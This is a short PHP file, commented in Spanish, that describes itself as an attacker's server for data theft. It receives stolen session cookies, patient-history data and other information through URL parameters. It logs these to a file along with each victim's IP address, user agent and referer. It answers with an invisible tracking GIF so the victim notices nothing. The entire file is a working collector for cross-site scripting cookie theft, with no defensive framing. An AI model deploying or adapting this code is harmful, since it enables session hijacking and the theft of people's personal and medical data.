<?php
// steal.php - Servidor del atacante para robo de datos
// Funciona en local y en Railway

// Crear un directorio para logs si no existe
$logDir = __DIR__ . '/storage/logs/';
if (!is_dir($logDir)) {
    mkdir($logDir, 0777, true);
}

$logFile = $logDir . 'cookies_robadas.txt';

// Obtener datos del ataque
$cookie = $_GET['cookie'] ?? 'No se recibió cookie';
$historial = $_GET['historial'] ?? 'No se recibió historial';
$info = $_GET['info'] ?? 'No se recibió info';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'No disponible';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
$referer = $_SERVER['HTTP_REFERER'] ?? 'No disponible';
$tiempo = date('Y-m-d H:i:s');

// Formatear el mensaje
$mensaje = "========================================\n";
$mensaje .= "⏰ Fecha: $tiempo\n";
$mensaje .= "📱 IP: $ip\n";
$mensaje .= "🌐 User-Agent: $userAgent\n";
$mensaje .= "🔗 Referer: $referer\n";

if ($cookie != 'No se recibió cookie') {
    $mensaje .= "🍪 Cookie Robada: $cookie\n";
}

if ($historial != 'No se recibió historial') {
    $mensaje .= "🏥 DATOS DEL HISTORIAL ROBADOS:\n";
    $datos = json_decode($historial, true);
    if ($datos) {
        foreach ($datos as $clave => $valor) {
            $mensaje .= "   📌 $clave: $valor\n";
        }
    } else {
        $mensaje .= $historial . "\n";
    }
}

if ($info != 'No se recibió info') {
    $mensaje .= "📊 Info Adicional: $info\n";
}

$mensaje .= "========================================\n\n";

// Guardar en el archivo
file_put_contents($logFile, $mensaje, FILE_APPEND);

// Responder con una imagen transparente para no levantar sospechas
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>